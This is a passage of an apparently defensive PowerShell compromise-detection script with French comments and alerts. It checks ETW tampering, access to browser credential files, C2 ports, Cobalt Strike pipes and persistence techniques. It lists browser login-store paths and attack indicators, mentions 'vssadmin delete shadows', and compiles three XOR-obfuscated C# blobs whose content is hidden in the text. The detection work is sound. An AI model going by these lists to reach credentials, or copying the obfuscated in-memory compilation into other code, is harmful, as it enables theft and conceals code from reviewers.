    $clipSrc_xb64 = 'X1lDRE0KeVNZXk9HESBfWUNETQp5U1leT0cEeF9EXkNHTwRjRF5PWEVaeU9YXENJT1kRIFpfSEZDSQpJRktZWQppRkNaSEVLWE5pQk9JQQpRIAoKCgpxbkZGY0daRVheAghfWU9YGRgETkZGCAN3ClpfSEZDSQpZXkteQ0kKT1JeT1hECmNEXnpeWAptT15lWk9EaUZDWkhFS1hOfUNETkVdAgMRIAoKCgpxbkZGY0daRVheAghfWU9YGRgETkZGCAN3ClpfSEZDSQpZXkteQ0kKT1JeT1hECl9DRF4KbU9efUNETkVdfkJYT0tOelhFSU9ZWWNOAmNEXnpeWApCfUROBgpFX14KX0NEXgpaQ04DESBXIA=='
    $clipSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($clipSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $clipSrc -Language CSharp -ErrorAction Stop
    $hwnd = [ClipboardCheck]::GetOpenClipboardWindow()
    if ($hwnd -ne [IntPtr]::Zero) {
        $pid = 0
        [ClipboardCheck]::GetWindowThreadProcessId($hwnd, [ref]$pid) | Out-Null
        if ($pid -gt 0) {
            $proc = Get-Process -Id ([int]$pid) -ErrorAction SilentlyContinue
            $pname = if ($proc) { $proc.Name } else { "PID $pid" }
            if ($pname -notmatch '^(explorer|svchost|rdpclip|ctfmon|searchui)$') {
                $clipboardHijacker = [PSCustomObject]@{ Process=$pname; PID=$pid }
            }
        }
    }
} catch {}

# ── ETW tampering ─────────────────────────────────────────────────────────────
$etwTampered = @()
try {
    $etwSrc_xb64 = 'X1lDRE0KeVNZXk9HESBfWUNETQp5U1leT0cEeF9EXkNHTwRjRF5PWEVaeU9YXENJT1kRIFpfSEZDSQpJRktZWQpvXl1pQk9JQQpRIAoKCgpxbkZGY0daRVheAghEXk5GRgRORkYIA3cKWV5LXkNJCk9SXk9YRApDRF4KZF57X09YU3lTWV5PR2NETEVYR0teQ0VEAkNEXgpJBgpjRF56XlgKSAYKX0NEXgpGBgpFX14KX0NEXgpYAxEgCgoKCnFuRkZjR1pFWF4CCEFPWERPRhkYBE5GRggDdwpZXkteQ0kKT1JeT1hECmNEXnpeWAplWk9EelhFSU9ZWQJfQ0ReCksGCkhFRUYKSAYKQ0ReCkkDESAKCgoKcW5GRmNHWkVYXgIIQU9YRE9GGRgETkZGCAN3ClleS15DSQpPUl5PWEQKSEVFRgp4T0tOelhFSU9ZWWdPR0VYUwJjRF56XlgKQgYKY0Reel5YCktOTlgGCkhTXk9xdwpIX0wGCkNEXgpZUAYKRV9eCkNEXgpYT0tOAxEgCgoKCnFuRkZjR1pFWF4CCEFPWERPRhkYBE5GRggDdwpZXkteQ0kKT1JeT1hECkhFRUYKaUZFWU9iS0RORk8CY0Reel5YCkIDESAKCgoKcW5GRmNHWkVYXgIIQU9YRE9GGRgETkZGCAN3ClleS15DSQpPUl5PWEQKY0Reel5YCm1PXmdFTl9GT2JLRE5GTwJZXlhDRE0KREtHTwMRIAoKCgpxbkZGY0daRVheAghBT1hET0YZGARORkYIA3cKWV5LXkNJCk9SXk9YRApjRF56XlgKbU9eelhFSWtOTlhPWVkCY0Reel5YCkdFTgYKWV5YQ0RNClpYRUkDESAKCgoKWl9IRkNJClleS15DSQpIRUVGCmNZb15dekteSUJPTgJDRF4KWkNOAwpRIAoKCgoKCgoKY0Reel5YCkReTkZGChcKbU9eZ0VOX0ZPYktETkZPAghEXk5GRgRORkYIAxEgCgoKCgoKCgpDTAoCRF5ORkYKFxcKY0Reel5YBHBPWEUDClhPXl9YRApMS0ZZTxEgCgoKCgoKCgpjRF56XlgKT15dfVhDXk8KFwptT156WEVJa05OWE9ZWQJEXk5GRgYKCG9eXW9cT0RefVhDXk8IAxEgCgoKCgoKCgpDTAoCT15dfVhDXk8KFxcKY0Reel5YBHBPWEUDClhPXl9YRApMS0ZZTxEgCgoKCgoKCgpjRF56XlgKWkIKFwplWk9EelhFSU9ZWQIaUhoaGxoGCkxLRllPBgpaQ04DESAKCgoKCgoKCkNMCgJaQgoXFwpjRF56XlgEcE9YRQMKWE9eX1hECkxLRllPESAKCgoKCgoKCl5YUwpRIAoKCgoKCgoKCgoKCkhTXk9xdwpIX0wKFwpET10KSFNeT3EedxEKQ0ReClhPS04KFwoaESAKCgoKCgoKCgoKCgpDTAoCC3hPS056WEVJT1lZZ09HRVhTAlpCBgpPXl19WENeTwYKSF9MBgoeBgpFX14KWE9LTgMKVlYKWE9LTgoWChsDClhPXl9YRApMS0ZZTxEgCgoKCgoKCgoKCgoKBQUKUkVYCk9LUgZPS1IKAhkZCmkaAwoBClhPXgoCaRkDCkVfCkdFXApPS1IGGgoBClhPXgoXClpLXklCCm9+fQpJRktZWUNbX08gCgoKCgoKCgoKCgoKWE9eX1hECgJIX0xxGncKFxcKGlIZGQoMDApIX0xxG3cKFxcKGlJpGgoMDApIX0xxGHcKFxcKGlJpGQMKVlYgCgoKCgoKCgoKCgoKCgoKCgoKCgJIX0xxGncKFxcKGlJpGQMKVlYgCgoKCgoKCgoKCgoKCgoKCgoKCgJIX0xxGncKFxcKGlJoEgoMDApIX0xxG3cKFxcKGlIaGgoMDApIX0xxGHcKFxcKGlIaGgMRIAoKCgoKCgoKVwpMQ0RLRkZTClEKaUZFWU9iS0RORk8CWkIDEQpXIAoKCgpXIFcg'
    $etwSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($etwSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $etwSrc -Language CSharp -ErrorAction Stop
    $SYS_ETW_EXEMPT = @($lsN,'csrss','smss','wininit','services','system')
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $SYS_ETW_EXEMPT -notcontains $_.Name.ToLower() } |
        Select-Object -First 60 | ForEach-Object {
            try {
                if ([EtwCheck]::IsEtwPatched($_.Id)) {
                    $procPath = try { $_.Path } catch { '' }
                    if (-not (Test-KnownFP -Check 'ETW' -Path $procPath)) {
                        $etwTampered += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id }
                    }
                }
            } catch {}
        }
} catch {}

# ── Browser credential store access ──────────────────────────────────────────
Write-Step 'Browser credential store access'
$credStoreAccess = @()
$BROWSER_CRED_FILES = @(
    @{ Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";   Browser='Chrome' },
    @{ Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data";  Browser='Edge' },
    @{ Path="$env:APPDATA\Mozilla\Firefox\Profiles";                          Browser='Firefox'; IsDir=$true },
    @{ Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; Browser='Brave' }
)
$LEGIT_BROWSER_PROCS = @('chrome','msedge','firefox','brave','opera','iexplore','MicrosoftEdgeCP','MicrosoftEdge')
foreach ($cf in $BROWSER_CRED_FILES) {
    $targetPath = $cf.Path
    if ($cf.IsDir) {
        $targetPath = Get-ChildItem $cf.Path -Filter 'logins.json' -Recurse -ErrorAction SilentlyContinue |
            Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $targetPath -or -not (Test-Path $targetPath)) { continue }
    try {
        # Vérifier via event 4663 si un process non-navigateur a accédé au fichier (dernières 24h)
        $fileAccess = Get-WinEvent -FilterHashtable @{
            LogName='Security'; Id=4663; StartTime=(Get-Date).AddHours(-24)
        } -ErrorAction Stop | Where-Object {
            $_.Message -match [regex]::Escape((Split-Path $targetPath -Leaf)) -and
            $_.Message -notmatch ($LEGIT_BROWSER_PROCS -join '|')
        } | Select-Object -First 5
        foreach ($ev in $fileAccess) {
            $accessor = if ($ev.Properties.Count -gt 6) { $ev.Properties[6].Value } else { 'inconnu' }
            $credStoreAccess += [PSCustomObject]@{ Browser=$cf.Browser; Accessor=$accessor; Time=$ev.TimeCreated.ToString('yyyy-MM-dd HH:mm') }
        }
    } catch {}
    # Fallback : vérifier si le fichier a été ouvert récemment par un process non-navigateur
    # en comparant LastAccessTime
    try {
        $fi = Get-Item $targetPath -ErrorAction Stop
        if ($fi.LastAccessTime -gt (Get-Date).AddHours(-24)) {
            # On ne peut pas savoir quel process sans Sysmon, on flag en info
            $credStoreAccess += [PSCustomObject]@{ Browser=$cf.Browser; Accessor='(accès récent — process inconnu sans Sysmon)'; Time=$fi.LastAccessTime.ToString('yyyy-MM-dd HH:mm') }
        }
    } catch {}
}

# ── Port scan sortant ─────────────────────────────────────────────────────────
Write-Step 'Port scan sortant + entropie PE'
$portScanners = @()
try {
    $connByProc = Get-NetTCPConnection -State SynSent -ErrorAction Stop |
        Where-Object { -not (Test-PrivateIP $_.RemoteAddress) } |
        Group-Object OwningProcess
    foreach ($grp in ($connByProc | Where-Object { $_.Count -ge 10 })) {
        $proc  = Get-Process -Id ([int]$grp.Name) -ErrorAction SilentlyContinue
        $pname = if ($proc) { $proc.Name } else { "PID $($grp.Name)" }
        $ports = ($grp.Group | ForEach-Object { $_.RemotePort } | Sort-Object -Unique)
        $portScanners += [PSCustomObject]@{ Process=$pname; PID=$grp.Name; UniqueTargetPorts=$ports.Count }
    }
} catch {}

# ── Entropie PE des fichiers suspects ─────────────────────────────────────────
Write-Step 'Entropie PE étendue (packed/chiffré)'
function Get-PEEntropy($path) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($path)
        if ($bytes.Count -lt 512) { return 0.0 }
        # Lire l'offset PE header
        $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
        if ($peOffset -le 0 -or $peOffset -ge $bytes.Count - 4) { return 0.0 }
        $peId = [System.Text.Encoding]::ASCII.GetString($bytes, $peOffset, 4)
        if ($peId -notmatch '^PE\x00\x00') { return 0.0 }
        # Calculer entropie sur les 4096 premiers octets du contenu (hors en-tête)
        $dataOffset = [Math]::Min($peOffset + 512, $bytes.Count - 4096)
        $sample = $bytes[$dataOffset..($dataOffset + 4095)]
        $freq = New-Object int[] 256
        foreach ($b in $sample) { $freq[$b]++ }
        $entropy = 0.0
        $total = $sample.Count
        foreach ($f in $freq) {
            if ($f -eq 0) { continue }
            $p = $f / $total
            $entropy -= $p * [Math]::Log($p, 2)
        }
        return [Math]::Round($entropy, 2)
    } catch { return 0.0 }
}
$highEntropyPE = @()
$ENTROPY_PATHS = @($env:APPDATA, $env:TEMP, "$env:USERPROFILE\Downloads", $env:PUBLIC)
foreach ($ep in $ENTROPY_PATHS) {
    if (-not (Test-Path $ep)) { continue }
    Get-ChildItem $ep -Recurse -Include *.exe,*.dll -ErrorAction SilentlyContinue |
        Select-Object -First 40 | ForEach-Object {
            $ent = Get-PEEntropy $_.FullName
            if ($ent -gt 7.0) {
                $highEntropyPE += [PSCustomObject]@{ Name=$_.Name; Path=$_.FullName; Entropy=$ent }
            }
        }
}

# ── Tokens avec élévation anormale ────────────────────────────────────────────
Write-Step 'Token elevation anomalies'
$tokenAnomalies = @()
try {
    $elevSrc_xb64 = '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'
    $elevSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($elevSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $elevSrc -Language CSharp -ErrorAction Stop
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch ('^(' + $lsN + '|csrss|wininit|smss|system)$') } |
        Select-Object -First 80 | ForEach-Object {
            try {
                $level = [ElevCheck]::GetIntegrityLevel($_.Id)
                if ($level -ge 0x4000 -and $_.Name -notmatch '^(services|svchost|taskhost|taskhostw|winlogon|spoolsv|fontdrvhost)$') {
                    $procPath = try { $_.Path } catch { '' }
                    if (-not (Test-KnownFP -Check 'TokenAnomaly' -Path $procPath)) {
                        $tokenAnomalies += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id; Level="SYSTEM (0x$($level.ToString('X4')))" }
                    }
                }
            } catch {}
        }
} catch {}

# ── Write-Host final [41/41] est dans la section moteur ───────────────────────
Write-Step 'Application des règles de scoring'

# ── Moteur de règles ──────────────────────────────────────────────────────────

$alerts   = @()
$alertId  = 1
function Add-Alert {
    param($sev, $short, $desc, $reco, [int]$confidence = 70, [string[]]$Steps = @())
    $script:alerts += [PSCustomObject]@{
        Id         = $script:alertId++
        Sev        = $sev
        Short      = $short
        Desc       = $desc
        Reco       = $reco
        Confidence = $confidence
        Steps      = $Steps
    }
}

# Processus dont les connexions réseau sont attendues (whitelist)
$TRUSTED_NET_PROCS = '^(discord|discordptb|discordcanary|steam|leagueclient|leagueoflegends|riotclientservices|riotclientux|msedge|chrome|firefox|opera|brave|spotify|valorant|epicgames|battle\.net|origin|uplay|gog)$'

# IPs malveillantes
foreach ($mip in ($networkRows | Where-Object { $_.Abuse -ge 80 })) {
    Add-Alert 'critique' "IP malveillante — $($mip.IP)" `
        "Connexion active vers <code>$($mip.IP)</code> (AbuseIPDB: <strong>$($mip.Abuse)%</strong>, $($mip.Country)). Processus: <code>$($mip.Proc)</code>." `
        "Bloquer l'IP immédiatement via le pare-feu Windows. Analyser <code>$($mip.Proc)</code> avec un antivirus. Envisager l'isolation de la machine." `
        -confidence 95
}
# IPs suspectes (groupées) — on sépare trusted vs inconnu
$suspIPs     = @($networkRows | Where-Object { $_.Abuse -ge 30 -and $_.Abuse -lt 80 })
$suspUnknown = @($suspIPs | Where-Object { $_.Proc -notmatch $TRUSTED_NET_PROCS })
$suspTrusted = @($suspIPs | Where-Object { $_.Proc -match    $TRUSTED_NET_PROCS })
if ($suspUnknown.Count -gt 0) {
    $ipList = ($suspUnknown | ForEach-Object { "$($_.IP) ($($_.Abuse)%, $($_.Proc))" }) -join ', '
    Add-Alert 'moyen' "$($suspUnknown.Count) IP(s) suspecte(s) détectée(s)" `
        "$($suspUnknown.Count) connexion(s) avec score AbuseIPDB modéré : <code>$ipList</code>." `
        "Identifier les processus responsables et vérifier leur légitimité." `
        -Steps @(
            "Identifier les connexions actives : Get-NetTCPConnection -State Established | Where-Object RemoteAddress -in @($($suspUnknown | ForEach-Object { `"'$($_.IP)'`" }) -join ',')",
            "Pour chaque IP suspecte, vérifier sur https://www.abuseipdb.com/ et https://www.virustotal.com/"
        )
}
if ($suspTrusted.Count -gt 0) {
    $ipList = ($suspTrusted | ForEach-Object { "$($_.IP) ($($_.Proc), $($_.Abuse)%)" }) -join ', '
    Add-Alert 'info' "IPs CDN avec score AbuseIPDB modéré ($($suspTrusted.Count))" `
        "Les IPs $ipList ont un score AbuseIPDB modéré, mais appartiennent à des processus connus (jeux, navigateurs). Ces scores sont fréquents sur les CDN partagés (Cloudflare, Akamai) — faux positifs habituels." `
        "Aucune action requise. Surveiller si le comportement change."
}
# Pays à risque (hors processus connus/trusted)
foreach ($rip in ($networkRows | Where-Object { ($HIGH_RISK_CC -contains $_.Country) -and $_.Abuse -lt 80 -and $_.Proc -notmatch $TRUSTED_NET_PROCS })) {
    Add-Alert 'eleve' "Connexion vers pays à risque ($($rip.Country))" `
        "Connexion vers <code>$($rip.IP)</code> ($($rip.ISP)) en <strong>$($rip.Country)</strong> via <code>$($rip.Proc)</code>." `
        "Vérifier si cette connexion est attendue pour ce logiciel. Bloquer le pays via pare-feu si non nécessaire." `
        -Steps @(
            "Identifier le processus responsable : Get-NetTCPConnection -RemoteAddress '$($rip.IP)' | ForEach-Object { Get-Process -Id `$_.OwningProcess }",
            "Bloquer via pare-feu Windows si non attendu : New-NetFirewallRule -DisplayName 'Block $($rip.IP)' -Direction Outbound -RemoteAddress '$($rip.IP)' -Action Block"
        )
}
# Ports C2
foreach ($cp in ($portRows | Where-Object { $C2_PORTS -contains $_.Port })) {
    Add-Alert 'critique' "Port C2 en écoute — $($cp.Port)/TCP" `
        "Le port <code>$($cp.Port)/TCP</code>, associé aux frameworks C2 et malwares, est en écoute (processus: <code>$($cp.Proc)</code>)." `
        "Arrêter immédiatement le processus <code>$($cp.Proc)</code>. Scanner la machine avec un antivirus. Isoler du réseau si compromis."
}
# RDP
if ($portRows | Where-Object { $_.Port -eq 3389 }) {
    Add-Alert 'eleve' "Bureau à distance (RDP) exposé" `
        "Le port <code>3389/TCP</code> est en écoute. Si accessible depuis Internet, c'est une cible privilégiée pour les attaques par force brute." `
        "Restreindre l'accès RDP via le pare-feu aux seules IPs autorisées. Activer NLA (Network Level Authentication). Utiliser un VPN."
}
# Telnet
if ($portRows | Where-Object { $_.Port -eq 23 }) {
    Add-Alert 'moyen' "Service Telnet actif" `
        "Telnet (<code>23/TCP</code>) est en écoute. Ce protocole transmet données et mots de passe en clair." `
        "Désactiver le service Telnet et basculer sur SSH (<code>22/TCP</code>)."
}
# SMB — écoute locale (réseau privé uniquement, rappel de sécurité)
if ($portRows | Where-Object { $_.Port -eq 445 }) {
    Add-Alert 'moyen' "SMB actif (port 445 — réseau local)" `
        "Le port <code>445/TCP</code> (SMB) est en écoute. Normal pour le partage de fichiers en réseau local, mais vecteur historique des ransomwares WannaCry/NotPetya si exposé à Internet." `
        "Vérifier que le port 445 n'est pas accessible depuis Internet (vérifier le pare-feu et le routeur). Activer Windows Defender avec les mises à jour pour se protéger." `
        -Steps @(
            "Vérifier que SMB est bloqué depuis Internet : Get-NetFirewallRule -DisplayName '*SMB*' | Select DisplayName, Enabled, Direction, Action",
            "Tester depuis l'extérieur : utiliser https://www.grc.com/x/ne.dll?bh0bkyd2 (ShieldsUP) pour vérifier la visibilité",
            "Si SMB inutile sur ce PC : Set-SmbServerConfiguration -EnableSMB1Protocol `$false -EnableSMB2Protocol `$false -Force"
        )
}
# Brute force
if ($failedLogons24h -gt 20) {
    Add-Alert 'eleve' "Possible brute force ($failedLogons24h échecs/24h)" `
        "<strong>$failedLogons24h</strong> échecs de connexion en 24h (<strong>$failedLogons7d</strong> sur 7 jours). Possible attaque par dictionnaire." `
        "Consulter l'Observateur d'événements (ID 4625). Bloquer les IPs source. Activer le verrouillage de compte."
} elseif ($failedLogons24h -gt 5) {
    Add-Alert 'moyen' "Échecs de connexion ($failedLogons24h en 24h)" `
        "<strong>$failedLogons24h</strong> échecs de connexion en 24h. Peut indiquer une erreur de configuration ou une tentative d'intrusion." `
        "Vérifier l'Observateur d'événements (ID 4625) pour identifier l'origine des échecs."
} elseif ($failedLogons24h -gt 0) {
    Add-Alert 'info' "Échecs de connexion ($failedLogons24h en 24h)" `
        "<strong>$failedLogons24h</strong> échec(s) de connexion enregistré(s) en 24h." `
        "Vérifier si ces échecs sont attendus (oubli de mot de passe, service mal configuré)."
}
# Processus suspects
foreach ($sp in $suspectProcs) {
    Add-Alert $sp.Sev "Processus suspect: $($sp.Name)" `
        "$($sp.Reason)." `
        "Analyser le chemin et les arguments du processus. Terminer si suspect et lancer un scan antivirus complet."
}
# Run keys suspects
foreach ($pi in ($persistItems | Where-Object { $_.Suspicious })) {
    Add-Alert 'eleve' "Run key suspecte: $($pi.Name)" `
        "Démarrage automatique anormal dans <code>$($pi.Hive)</code> : <code>$($pi.Name)</code> → <code>$($pi.Value)</code>." `
        "Supprimer l'entrée dans regedit si inconnue. Scanner le fichier pointé avec un antivirus."
}
# Run keys inconnus (info)
$unknownRunCount = ($persistItems | Where-Object { -not $_.Suspicious }).Count
if ($unknownRunCount -gt 0) {
    $names = ($persistItems | Where-Object { -not $_.Suspicious } | Select-Object -First 10 | ForEach-Object { $_.Name }) -join ', '
    Add-Alert 'info' "$unknownRunCount entrée(s) de démarrage auto" `
        "Entrées Run non suspectes à inventorier : <code>$names</code>$(if($unknownRunCount -gt 10){' ...'})." `
        "Vérifier que chaque entrée correspond à un logiciel intentionnellement installé."
}
# Tâches planifiées suspectes
foreach ($st in $suspTasks) {
    Add-Alert 'critique' "Tâche planifiée suspecte: $($st.Name)" `
        "Tâche <code>$($st.TaskPath)$($st.Name)</code> exécute <code>$($st.Execute)</code> avec args <code>$($st.Args)</code>." `
        "Désactiver via <code>Disable-ScheduledTask -TaskName '$($st.Name)'</code>. Scanner le fichier exécuté."
}
# WMI subscriptions
if ($wmiSubCount -gt 0) {
    $wmiNameList = if ($wmiSubNames.Count -gt 0) { " Filtres : <code>$($wmiSubNames -join ', ')</code>." } else { '' }
    # Vérifier si les noms correspondent à des outils legit connus (Windows Defender, SysMon, etc.)
    $wmiAllKnown = ($wmiSubNames | Where-Object { $_ -notmatch 'defender|sysinternals|sysmon|schannel|microsoft|BVTFilter|TSlogonEvents|TSlogonFilter|PerformanceMonitor|SCM Event Log|Service Control|Windows Events' }).Count -eq 0
    $wmiSev = if ($wmiAllKnown) { 'info' } else { 'critique' }
    Add-Alert $wmiSev "$wmiSubCount abonnement(s) WMI persistant(s) détecté(s)" `
        "<strong>$wmiSubCount</strong> FilterToConsumerBinding(s) dans <code>root\subscription</code>.$wmiNameList Technique de persistance fileless utilisée par des APT, mais aussi par des outils légitimes." `
        "Examiner avec <code>Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding</code> et supprimer si inconnu." `
        -Steps @(
            "Lister les abonnements WMI : Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select Filter, Consumer",
            "Lister les filtres : Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select Name, Query",
            "Supprimer un abonnement suspect : Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { `$_.Filter -match 'NomSuspect' } | Remove-WmiObject"
        )
}
# Dossiers Startup
if ($startupItems.Count -gt 0) {
    $itemList = ($startupItems | ForEach-Object { $_.Name }) -join ', '
    Add-Alert 'moyen' "$($startupItems.Count) fichier(s) dans les dossiers Startup" `
        "Fichiers dans les dossiers de démarrage : <code>$itemList</code>." `
        "Vérifier chaque entrée. Supprimer tout fichier non reconnu."
}
# Fichier hosts
if ($hostsAnomalies.Count -gt 0) {
    $hList = ($hostsAnomalies | Select-Object -First 10 | ForEach-Object { "<code>$($_ -replace '<','&lt;' -replace '>','&gt;')</code>" }) -join ' '
    Add-Alert 'eleve' "$($hostsAnomalies.Count) redirection(s) dans hosts" `
        "Le fichier hosts contient des entrées non standard : $hList. Possible DNS hijacking local ou blocage antivirus/adware." `
        "Supprimer les lignes inconnues dans <code>C:\Windows\System32\drivers\etc\hosts</code>."
}
# Services suspects
foreach ($ss in $suspServices) {
    Add-Alert 'critique' "Service suspect en cours: $($ss.Name)" `
        "Service <code>$($ss.Display)</code> tourne depuis un chemin anormal : <code>$($ss.Path)</code>." `
        "Arrêter via <code>Stop-Service '$($ss.Name)'</code> et analyser le binaire. Désactiver si non reconnu."
}
# DLL non signées dans process système
foreach ($dl in $suspDlls) {
    Add-Alert 'critique' "DLL suspecte dans $($dl.Process)" `
        "Module <code>$($dl.DLL)</code> chargé dans <code>$($dl.Process)</code> avec signature <strong>$($dl.Status)</strong> — possible DLL injection." `
        "Analyser le fichier avec un antivirus. Vérifier le hash sur VirusTotal. Redémarrer si injection confirmée."
}
# Connexions process inattendus
foreach ($uc in $unexpectedConns) {
    Add-Alert 'critique' "Connexion réseau inattendue: $($uc.Process)" `
        "<code>$($uc.Process)</code> établit une connexion externe vers <code>$($uc.Remote)</code> — ce processus ne devrait pas faire de réseau. Injection probable." `
        "Terminer le processus immédiatement. Isoler la machine. Scanner avec un antivirus."
}
# Named pipes Cobalt Strike
foreach ($np in $suspPipes) {
    Add-Alert 'critique' "Named pipe C2 suspect" `
        "Pipe correspondant aux patterns d'outils offensifs C2 détecté : <code>$np</code>." `
        "Chercher le process qui détient ce pipe via Sysinternals Process Explorer. Isoler la machine."
}
# Exécutables récents dans chemins suspects
if ($recentExes.Count -gt 0) {
    $exeList = ($recentExes | Select-Object -First 8 | ForEach-Object { "<code>$($_.Name)</code> ($($_.Created))" }) -join ', '
    $sev = if ($recentExes | Where-Object { $_.Path -match '\\temp\\|\\roaming\\' }) { 'eleve' } else { 'moyen' }
    Add-Alert $sev "$($recentExes.Count) exécutable(s) récent(s) dans chemins suspects" `
        "Fichiers créés dans les 30 derniers jours dans AppData/Temp/Downloads/Public : $exeList$(if($recentExes.Count -gt 8){' ...'})." `
        "Analyser chaque fichier avec VirusTotal ou un antivirus. Supprimer tout inconnu."
}
# ADS
foreach ($ads in $adsFound) {
    Add-Alert 'eleve' "Alternate Data Stream suspect" `
        "Fichier <code>$($ads.File)</code> contient un ADS masqué : <code>$($ads.Streams)</code>. Technique de dissimulation de code." `
        "Examiner avec <code>Get-Item '$($ads.File)' -Stream *</code>. Extraire et analyser le contenu."
}
# Profils PowerShell suspects
foreach ($pp in $suspProfiles) {
    Add-Alert 'critique' "Profil PowerShell malveillant" `
        "Le profil <code>$pp</code> contient du code de téléchargement ou d'exécution dynamique — s'exécute à chaque session PowerShell." `
        "Inspecter et vider le fichier. C'est une technique de persistence post-exploitation."
}
# Shadow copies
if ($shadowCount -eq 0) {
    Add-Alert 'eleve' "Aucune shadow copy disponible" `
        "Aucun point de restauration VSS trouvé. Peut indiquer une suppression par ransomware (<code>vssadmin delete shadows</code>)." `
        "Vérifier si une suppression a eu lieu récemment. Activer les points de restauration système."
}
# IFEO debugger hijack
foreach ($if in $ifeoItems) {
    Add-Alert 'critique' "IFEO Debugger hijack: $($if.Exe)" `
        "Image File Execution Options : <code>$($if.Exe)</code> redirigé vers <code>$($if.Debugger)</code>. Permet de remplacer un exécutable par un malware." `
        "Supprimer la valeur Debugger dans <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$($if.Exe)</code>."
}
# AppInit_DLLs
if ($appInitDlls -and $appInitDlls.Trim() -ne '') {
    Add-Alert 'critique' "AppInit_DLLs non vide" `
        "<code>AppInit_DLLs</code> = <code>$appInitDlls</code>. Cette DLL est injectée dans tout process user-mode utilisant user32.dll." `
        "Vider la valeur AppInit_DLLs dans <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code> si inconnue."
}
# Winlogon
foreach ($wa in $winlogonAlerts) {
    Add-Alert 'critique' "Winlogon modifié" `
        "$wa — modification de Userinit ou Shell dans Winlogon. Technique de persistence au niveau du login Windows." `
